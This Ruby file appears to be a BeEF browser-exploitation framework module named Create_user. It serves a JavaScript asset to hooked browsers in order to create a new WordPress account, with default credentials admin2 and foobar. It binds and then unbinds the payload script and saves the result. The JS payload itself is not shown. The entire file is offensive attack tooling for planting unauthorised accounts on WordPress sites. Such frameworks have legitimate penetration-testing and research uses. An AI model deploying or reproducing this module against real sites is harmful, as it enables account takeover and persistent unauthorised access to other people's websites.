class Create_user < BeEF::Core::Command

  def self.options
    return [
      {
      name: 'user_login',
      ui_label: 'User name',
      value: 'admin2',
    },
    {
      name: 'user_email',
      ui_label: 'User email',
      value: 'admin2@example.org',
    },
    {
      name: 'user_pass',
      ui_label: 'User password',
      value: 'foobar',
    },
    ]
  end

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/wordpress/create_user/assets/js/async.js','/wordpress/create_user/async.js','js')
  end

  def post_execute
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/wordpress/create_user/async.js') 
    save({'answer' => @datastore['answer']})
  end
end
